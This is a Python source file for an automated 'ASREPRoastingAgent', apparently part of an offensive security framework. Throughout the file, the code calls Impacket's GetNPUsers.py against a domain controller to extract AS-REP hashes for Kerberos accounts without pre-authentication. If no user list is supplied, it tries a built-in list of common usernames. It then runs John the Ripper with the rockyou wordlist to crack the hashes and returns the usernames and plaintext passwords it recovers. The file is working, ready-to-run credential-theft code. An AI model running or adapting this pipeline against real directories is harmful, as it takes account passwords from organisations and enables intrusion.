"""
ASREPRoasting Agent - Attack users without Kerberos pre-authentication
Uses Impacket's GetNPUsers.py (free tool)
"""

import asyncio
import os
import logging
from typing import Dict, Any, List
from core.base_agent import BaseAgent
from core.agent_data import AgentData

log = logging.getLogger(__name__)


class ASREPRoastingAgent(BaseAgent):
    """
    AS-REP Roasting attack agent
    
    Targets users with DONT_REQ_PREAUTH flag set
    Extracts AS-REP hashes that can be cracked offline
    """
    
    def __init__(self):
        super().__init__(
            name="ASREPRoastingAgent",
            description="Extract AS-REP hashes for users without Kerberos pre-authentication",
            version="1.0.0"
        )
        self.output_dir = "workspace/asreproast"
        os.makedirs(self.output_dir, exist_ok=True)
        self.timeout = 180  # 3 minutes
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            strategy: {
                "domain": "example.com",
                "dc_ip": "10.0.0.1",
                "usersfile": "users.txt" (optional),
                "username": "user" (optional, for authenticated scan),
                "password": "pass" (optional),
                "format": "hashcat" or "john" (default: hashcat)
            }
        """
        try:
            domain = strategy.get('domain')
            dc_ip = strategy.get('dc_ip')
            
            if not domain:
                return AgentData(success=False, errors=["Missing domain"])
            
            # Try authenticated scan first if credentials provided
            username = strategy.get('username')
            password = strategy.get('password')
            
            if username and password:
                log.info(f"[ASREPRoast] Performing authenticated scan as {username}")
                result = await self.authenticated_scan(domain, dc_ip, username, password, strategy)
            else:
                log.info(f"[ASREPRoast] Performing unauthenticated scan")
                result = await self.unauthenticated_scan(domain, dc_ip, strategy)
            
            return AgentData(
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[ASREPRoast] Error: {e}")
            return AgentData(success=False, errors=[str(e)])
    
    async def authenticated_scan(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str,
        strategy: Dict
    ) -> Dict:
        """
        Authenticated AS-REP Roasting scan
        Enumerates all users with DONT_REQ_PREAUTH flag
        """
        
        output_format = strategy.get('format', 'hashcat')
        
        cmd = [
            'GetNPUsers.py',
            f'{domain}/{username}:{password}',
            '-dc-ip', dc_ip,
            '-request',
            '-format', output_format,
            '-outputfile', f'{self.output_dir}/asrep_hashes.txt'
        ]
        
        try:
            result = await self._run_command(cmd)
            
            if result["exit_code"] == 0:
                hashes = self._parse_hashes(result["stdout"])
                
                # Save hashes to file
                if hashes:
                    hash_file = f'{self.output_dir}/asrep_hashes.txt'
                    with open(hash_file, 'w') as f:
                        f.write('\n'.join(hashes))
                    
                    log.success(f"[ASREPRoast] Found {len(hashes)} AS-REP hashes")
                    
                    # Attempt to crack hashes
                    cracked = await self._crack_hashes(hash_file, output_format)
                    
                    return {
                        "success": True,
                        "method": "authenticated",
                        "hashes": hashes,
                        "count": len(hashes),
                        "hash_file": hash_file,
                        "cracked": cracked,
                        "raw_output": result["stdout"]
                    }
                else:
                    return {
                        "success": False,
                        "method": "authenticated",
                        "message": "No users with DONT_REQ_PREAUTH found",
                        "raw_output": result["stdout"]
                    }
            else:
                return {
                    "success": False,
                    "method": "authenticated",
                    "error": result["stderr"],
                    "raw_output": result["stdout"]
                }
        
        except FileNotFoundError:
            return {
                "success": False,
                "error": "GetNPUsers.py not found",
                "install_command": "pip3 install impacket"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def unauthenticated_scan(self, domain: str, dc_ip: str, strategy: Dict) -> Dict:
        """
        Unauthenticated AS-REP Roasting scan
        Requires a list of usernames to test
        """
        
        usersfile = strategy.get('usersfile')
        output_format = strategy.get('format', 'hashcat')
        
        if not usersfile:
            # Try common usernames
            usersfile = await self._generate_common_users(domain)
        
        if not os.path.exists(usersfile):
            return {
                "success": False,
                "error": f"Users file not found: {usersfile}",
                "note": "Provide usersfile or perform authenticated scan"
            }
        
        cmd = [
            'GetNPUsers.py',
            f'{domain}/',
            '-dc-ip', dc_ip,
            '-no-pass',
            '-usersfile', usersfile,
            '-format', output_format,
            '-outputfile', f'{self.output_dir}/asrep_hashes.txt'
        ]
        
        try:
            result = await self._run_command(cmd)
            
            hashes = self._parse_hashes(result["stdout"])
            
            if hashes:
                hash_file = f'{self.output_dir}/asrep_hashes.txt'
                with open(hash_file, 'w') as f:
                    f.write('\n'.join(hashes))
                
                log.success(f"[ASREPRoast] Found {len(hashes)} AS-REP hashes")
                
                # Attempt to crack
                cracked = await self._crack_hashes(hash_file, output_format)
                
                return {
                    "success": True,
                    "method": "unauthenticated",
                    "hashes": hashes,
                    "count": len(hashes),
                    "hash_file": hash_file,
                    "cracked": cracked,
                    "raw_output": result["stdout"]
                }
            else:
                return {
                    "success": False,
                    "method": "unauthenticated",
                    "message": "No vulnerable users found",
                    "raw_output": result["stdout"]
                }
        
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def _generate_common_users(self, domain: str) -> str:
        """Generate file with common usernames"""
        
        common_users = [
            'administrator', 'admin', 'guest', 'krbtgt',
            'test', 'user', 'service', 'backup',
            'sql_service', 'web_service', 'app_service'
        ]
        
        users_file = f'{self.output_dir}/common_users.txt'
        with open(users_file, 'w') as f:
            f.write('\n'.join(common_users))
        
        return users_file
    
    def _parse_hashes(self, output: str) -> List[str]:
        """Parse AS-REP hashes from output"""
        
        hashes = []
        
        for line in output.split('\n'):
            if '$krb5asrep$' in line:
                hashes.append(line.strip())
        
        return hashes
    
    async def _crack_hashes(self, hash_file: str, format: str) -> List[Dict]:
        """
        Attempt to crack AS-REP hashes using John the Ripper
        
        Returns:
            List of cracked credentials
        """
        
        log.info(f"[ASREPRoast] Attempting to crack hashes...")
        
        # Use John the Ripper (free tool)
        cmd = [
            'john',
            '--wordlist=/usr/share/wordlists/rockyou.txt',
            '--format=krb5asrep',
            hash_file
        ]
        
        try:
            result = await self._run_command(cmd, timeout=300)  # 5 min timeout
            
            # Show cracked passwords
            show_cmd = ['john', '--show', '--format=krb5asrep', hash_file]
            show_result = await self._run_command(show_cmd)
            
            cracked = self._parse_cracked(show_result["stdout"])
            
            if cracked:
                log.success(f"[ASREPRoast] Cracked {len(cracked)} passwords!")
            
            return cracked
        
        except FileNotFoundError:
            log.warning("[ASREPRoast] John the Ripper not found. Install: apt-get install john")
            return []
        except Exception as e:
            log.error(f"[ASREPRoast] Cracking error: {e}")
            return []
    
    def _parse_cracked(self, output: str) -> List[Dict]:
        """Parse cracked passwords from John output"""
        
        cracked = []
        
        for line in output.split('\n'):
            if ':' in line and not line.startswith('0 password'):
                parts = line.split(':')
                if len(parts) >= 2:
                    cracked.append({
                        'username': parts[0],
                        'password': parts[1]
                    })
        
        return cracked
    
    async def _run_command(self, cmd: List[str], timeout: int = None) -> Dict:
        """Run command asynchronously"""
        
        if timeout is None:
            timeout = self.timeout
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            
            return {
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore')
            }
        
        except asyncio.TimeoutError:
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": "Command timed out"
            }
        except Exception as e:
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": str(e)
            }

